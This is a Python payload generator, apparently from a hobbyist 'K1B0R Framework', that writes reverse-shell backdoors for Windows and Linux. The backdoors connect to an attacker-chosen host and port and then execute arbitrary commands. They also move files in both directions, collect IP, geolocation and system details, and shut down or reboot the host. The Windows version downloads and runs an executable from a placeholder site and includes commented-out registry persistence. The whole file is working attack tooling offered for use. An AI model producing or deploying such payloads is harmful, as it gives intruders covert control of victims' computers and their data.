import os
from colorama import init, Fore, Back, Style
import argparse

init(autoreset=True)


def write_file(path, text):
    file_write = open(path, "w")
    file_write.write(text)
    file_write.close()

parser = argparse.ArgumentParser(description='K1B0R Framework Payload Generator | Framework Created By K1B0R')
parser.add_argument('-lh', '--lhost', type=str, help='Set The Host That The Payload Will Connect Back To')
parser.add_argument('-lp', '--lport', type=int, help='Set The Port That The Payload Will Connect Back To')
parser.add_argument('-os', '--system' ,help='Selects Either Linux Or Windows As Main OS Target Ex: windows, linux')
parser.add_argument('-ban', '--banner', type=str, help='Displays Frameworks Banner Made By OreoByte USE: --banner show')
args = parser.parse_args()

if args.system == 'windows':
    print(Style.BRIGHT + Fore.RED + '[+] Generating The Payload')
    write_file('WindowsPayload.py', f"""
import socket
import subprocess
import os
import winreg as reg
import time
import webbrowser
import urllib.request
import json

# def AddToStartup(f_name, path): 

#     address=os.path.join(path, f_name)  
#     key = reg.HKEY_CURRENT_USER 
#     key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#     open = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
#     reg.SetValueEx(open, "any_name", 0, reg.REG_SZ, address) 
#     reg.CloseKey(open)


def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Try Until Not Connected
    connected = False
    while (connected == False):
        try:
            
            s.connect(('{args.lhost}', {args.lport}))

            connected = True

            cwd = os.getcwd()
            s.send(("dir:" + str(cwd)).encode('utf-8'))
            
        except:

            print(".", end="")

    while True:
        try:

            command = s.recv(2048).strip().decode('utf-8')

            if 'terminate' in command:
                s.close()
                break

            elif 'trollsploit.fbi_openup' in command:
                url = 'https://www.youtube.com/watch?v=ScUAiJj6D5M'
                webbrowser.get().open(url)

            elif 'sysctl.restart' in command:
                try:
                    os.system('shutdown /r')
                except:
                    'null'

            elif 'trollsploit.rickroll' in command:
                try:
                    url = 'https://www.youtube.com/watch?v=xvFZjo5PgG0'
                    webbrowser.get().open(url)
                except:
                    'null'


            elif 'migrate' in command:
                try:
                    os.system('powershell cp ~/Desktop/hehe.exe C:/temp/')
                    s.close()
                    os.system('powershell C:/temp/hehe.exe -e cmd.exe')
                except:
                    return 'null'


            elif 'data.ip' in command:
                try:
                    csocket = s.accept()
                    public_ip = urllib.request.urlopen('https://api.ipify.org/').read().decode('utf-8')
                    csocket.send(public_ip.encode('utf-8'))
                except:
                    return 'null'

            elif 'systemctl.eject' in command:
                try:
                    os.system('powershell (New-Object -com "WMPlayer.OCX.7").cdromcollection.item(0).eject()')
                except:
                    'null'

            elif 'trollsploit.orange' in command:
                try:
                    os.system('powershell curl https://YOURWEBSITE.io/orange.exe -o orange.exe')
                    os.system('powershell mv orange C:/temp/')
                    os.system('powershell C:/temp/orange.exe')
                except:
                    'null'

            elif 'data.location' in command:
                try:
                    data = urllib.request.urlopen('https://freegeoip.app/json/').read().decode('utf-8')
                    json_data = json.loads(data)
                    country_name = json_data['country_name']
                    city = json_data['city']
                    message = f'[+] Current Location: ' + country_name +  city
                    s.send(message.encode('utf-8'))
                    s.close()
                except:
                    'null'

            elif 'trollsploit.fbi_openup' in command:
                try:
                    url = 'https://www.youtube.com/watch?v=ScUAiJj6D5M'
                    webbrowser.get().open(url)
                except:
                    'null'
            
            elif 'trollsploit.rickroll' in command:
                try:
                    url = 'https://www.youtube.com/watch?v=xvFZjo5PgG0'
                    webbrowser.get().open(url)
                except:
                    'null'

            elif 'priv.exec' in command:
                try:
                    s.close()
                    os.system('powershell C:/temp/privesc.ps1')
                except:
                    'null'

            elif command.startswith('grab'):

                file_name = command[5:]

                file_size = os.path.getsize(file_name)

                s.send(file_name.encode('utf-8'))

                s.recv(1024).decode('utf-8')


                s.send(str(file_size).encode('utf-8'))

                s.recv(1024).decode('utf-8')
                with open(file_name, "rb") as file:

                    c = 0
                    start_time = time.time()
                    while c < file_size:
                        data = file.read(1024)
                        if not (data):
                            break
                        s.sendall(data)
                        c += len(data)

                    end_time = time.time()
            elif 'transfer' in command:
                file_name = s.recv(1024).decode('utf-8')
                s.send('OK'.encode('utf-8'))
                file_size = s.recv(1024).decode('utf-8')
                s.send('OK'.encode('utf-8'))
                with open(file_name, "wb") as file:

                    c = 0
                    
                    start_time = time.time()

                    while c < int(file_size):

                        data = s.recv(1024)

                        if not (data):
                            break

                        file.write(data)

                        c += len(data)
                    end_time = time.time()
            elif command.startswith('cd '):

                dir = command[3:]
                try:
                    os.chdir(dir)

                except:
                    os.chdir(cwd)
                cwd = os.getcwd()
                
                s.send(("dir:" + str(cwd)).encode('utf-8'))

            elif command.startswith('startup'):

                file_name = command[8:]

                pth = os.getcwd()

                try:
                    AddToStartup(file_name, pth)
                    s.send("OK".encode('utf-8'))

                except Exception as e:
                    s.send(str(e).encode('utf-8'))

            else:
                # Executing Command
                CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                out = CMD.stdout.read()
                err = CMD.stderr.read()
                s.send(out)
                s.send(err)
                if (out == b'' and err == b''):
                    s.send("OK".encode('utf-8'))
                    
        except Exception as e:
            s.send(str(e).encode('utf-8'))


connected = False
while (not connected):
    try:
        connect()
        connected = True
    except:
        print(".", end = "")
    """)
    print(Style.BRIGHT + Fore.RED + '[+] Payload Generated!')
    file_size = os.stat('WindowsPayload.py')
    print(Style.BRIGHT + Fore.RED + '[!] Payload Size:', file_size.st_size, Style.BRIGHT + Fore.RED + 'Bytes')
    print(Style.BRIGHT + Fore.MAGENTA + '[!] Operating System Target Windows')

elif args.system == 'linux':
    print(Style.BRIGHT + Fore.RED + '[+] Generating The Payload')
    write_file('LinuxPayload.py', f"""
import socket
import subprocess
import os
import time
import webbrowser
import platform
import urllib.request
import json
import os
from io import BytesIO

# Connecting Target To Attacker

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Try Until Not Connected
    connected = False
    while (connected == False):
        try:
            
            # Note: Please Place Attacker's IP Here
            s.connect(('{args.lhost}', {args.lport}))

            # Connected
            connected = True

            # Sending Current Working Directory Of Target To Attacker
            cwd = os.getcwd()
            s.send(("dir:" + str(cwd)).encode('utf-8'))
            
        except:
            # If Failed To Connect, Print A Dot And Try Again
            print(".", end="")

    while True:
        try:
            # Recieve Command From Attacker
            command = s.recv(2048).strip().decode('utf-8')

            # Terminate Script
            if 'terminate' in command:
                s.close()
                break 

            elif 'trollsploit.fbi_openup' in command:
                url = 'https://www.youtube.com/watch?v=ScUAiJj6D5M'
                webbrowser.get().open(url)

            elif 'sysctl.restart' in command:
                try:
                    os.system('shutdown /r')
                except:
                    'null'

            elif 'trollsploit.rickroll' in command:
                try:
                    url = 'https://www.youtube.com/watch?v=xvFZjo5PgG0'
                    webbrowser.get().open(url)
                except:
                    'null'

            elif 'data.ip' in command:
                try:
                    csocket = s.accept()
                    public_ip = urllib.request.urlopen('https://api.ipify.org/').read().decode('utf-8')
                    csocket.send(public_ip.encode('utf-8'))
                except:
                    return 'null'

            elif 'commands' in command:
                message = '''
                +========================================================+
                                    Data Exfiltration
                    [1] data.location               # Locates The Targets Where abouts
                    [2] data.ip                     # Shows The Targets IP Adress
                    [3] data.core                   # Shows The Users CPU
                    [4] data.os                     # Shows The Targets Machine OS
                    [5] data.hostname               # Shows The Target Computes Hostname
                    [6] data.mac                    # Shows The Computers MAC Address
        
                +=========================================================+
                                        TrollSploit
                    [1] trollsploit.rickroll        # Opens Browser And Plays Rick Ashley Never Gonna Give You Up
                    [2] trollsploit.fbi_openup      # Plays Funny FBI Open Up Loli Dnace x3

                +=========================================================+
                                        System Control
                    [1] sysctl.shutdown             #Shuts Down Computer 
                    [4] sysctl.restart              # Restarts Computer
                '''
                s.send(message.encode('utf-8'))

            elif 'data.location' in command:
                try:
                    data = urllib.request.urlopen('https://freegeoip.app/json/').read().decode('utf-8')
                    json_data = json.loads(data)
                    country_name = json_data['country_name']
                    city = json_data['city']
                    message = f'[+] Current Location: ' + country_name +  city
                    s.send(message.encode('utf-8'))
                    s.close()
                except:
                    'null'

            elif 'data.ip' in command:
                try:
                    data = urllib.request.urlopen('https://api.ipify.org/').read().decode('utf-8')
                    s.send(data.encode('utf-8'))
                    s.close()
                except:
                    'null'

            elif 'data.os' in command:
                try:
                    message = platform.system()
                    s.send(message.encode('utf-8'))
                    s.close()
                except:
                    'null'

            elif 'sysctl.shutdown' in command:
                try:
                    os.system('shutdown now')
                except:
                    'null'

            elif 'data.core' in command:
                try:
                    message = platform.machine()
                    s.send(message.encode('utf-8'))
                    s.close()
                except:
                    'null'

            elif 'data.hostname' in command:
                try:
                    message = socket.getfqdn(socket.gethostname()).strip()
                    s.send(message.encode('utf-8'))
                    s.close()
                except:
                    'null'

            elif 'sysctl.shutdown' in command:
                try:
                    os.system('shutdown now')
                except:
                    'null'

            elif 'sysctl.restart' in command:
                try:
                    os.system('reboot')
                except:
                    'null'


            # Grabbing Files
            # Example: grab picture.jpg
            elif command.startswith('download'):

                # Extracting filename From Command
                # Skipping 1st Five Characters
                # Because They Are 'g', 'r', 'a', 'b', ' '
                file_name = command[5:]

                # Getting File Size
                file_size = os.path.getsize(file_name)

                # Sending File Name
                s.send(file_name.encode('utf-8'))

                # Recieving Response From Target
                # e.g., OK Response
                s.recv(1024).decode('utf-8')

                # Sending File Size
                s.send(str(file_size).encode('utf-8'))

                # Recieving Response
                s.recv(1024).decode('utf-8')

                # Opening File To Read
                # File Will Be Sent In Small Chunks Of Data
                with open(file_name, "rb") as file:

                    # Chunks Sent = 0
                    c = 0
                    
                    # Starting Time
                    start_time = time.time()

                    # Running Loop Until c < file_size
                    while c < file_size:

                        # Read 1024 Bytes
                        data = file.read(1024)

                        # If No Bytes, Stop
                        if not (data):
                            break

                        # Send Bytes
                        s.sendall(data)

                        # Chunks Sent += Length Of Data
                        c += len(data)

                    # Ending Time
                    end_time = time.time()

            # Transfer File From Attacker To Target
            # Example: video.mp4
            elif 'upload' in command:

                # Recieving Name Of File To Be Transferred
                file_name = s.recv(1024).decode('utf-8')

                # Sending Response
                s.send('OK'.encode('utf-8'))

                # Recieving Size Of File To Be Transferred
                file_size = s.recv(1024).decode('utf-8')

                # Sending Response
                s.send('OK'.encode('utf-8'))

                # Opening File For Writing
                with open(file_name, "wb") as file:

                    # Chunks Recieved
                    c = 0
                    
                    # Starting Time
                    start_time = time.time()

                    # Running Until c < int(file_size)
                    while c < int(file_size):

                        # Recieve 1024 Bytes
                        data = s.recv(1024)

                        # If No Data, Stop
                        if not (data):
                            break

                        # Write Bytes To File
                        file.write(data)

                        # Chunks Added
                        c += len(data)

                    # Ending Time
                    end_time = time.time()

            # Changing Working Directory Of Target
            # Example: D:/
            elif command.startswith('cd '):

                # Extracting Directory
                # Skipping 3 Characters
                # They Are 'c', 'd', ' '
                dir = command[3:]

                # Change Directory
                try:
                    os.chdir(dir)

                except:
                    # If Failed, Revert
                    os.chdir(cwd)

                # Get Updated Working Directory
                cwd = os.getcwd()
                
                # Send Updated Directory To Attacker
                s.send(("dir:" + str(cwd)).encode('utf-8'))

            # Putting File In Startup Folder
            # Only Works For Windows
            # Example: starup T.py
            elif command.startswith('startup'):

                # Extracting Filename
                file_name = command[8:]

                # Extracting Path Of File
                # As File Is In Current Working Directory
                # Get Current Working Directory
                pth = os.getcwd()

                # Put File In Startup
                try:
                    AddToStartup(file_name, pth)

                    # Send OK To Attacker
                    s.send("OK".encode('utf-8'))

                # If Failed, Send Exception Message To Attacker
                except Exception as e:
                    s.send(str(e).encode('utf-8'))

            # Otherwise The Command Will Be Considered As CMD OR Terminal Command
            # Command Will Be Executed In Terminal
            else:
                # Executing Command
                CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

                # If Command Executes Succefully
                # Get Output Of Command
                out = CMD.stdout.read()

                # If Error Occured
                # Get Error Of Command
                err = CMD.stderr.read()

                # Send Output
                s.send(out)

                # Send Error
                s.send(err)

                # Some Commads Are Executed Successfully, But
                # They Don't Have Any Output
                # For Example: del file.ext
                # Above Command On Execution Doesn't Show Any Output
                # Put Our Attacker Is Alwayes Looking For Output
                # So, If There Is No Output And No Error
                # Send OK
                if (out == b'' and err == b''):
                    s.send("OK".encode('utf-8'))
                    
        # If Attacker Command Was Unable To Be Executed
        except Exception as e:

            # Send Exception Message To Attacker
            s.send(str(e).encode('utf-8'))


# Start Of Script
# If Connection Breaks
# Script Tries To Connect Again And Again


connected = False
while (not connected):
    try:
        connect()
        connected = True
    except:
        print(".", end = "")
    """)
    print(Style.BRIGHT + Fore.RED + '[+] Payload Generated!')
    file_size = os.stat('LinuxPayload.py')
    print(Style.BRIGHT + Fore.RED + '[!] Payload Size:', file_size.st_size, Style.BRIGHT + Fore.RED + 'Bytes')
    print(Style.BRIGHT + Fore.MAGENTA + '[!] Operating System Target Linux')

elif args.banner == 'show':
    file = open("~/Desktop/K1B0RFRAMEWORKBETAEARLYACCESS/K1B0RFRAMEWORK/Extra/asciiart.txt", 'r')
    print(Style.BRIGHT + Fore.MAGENTA + file.read())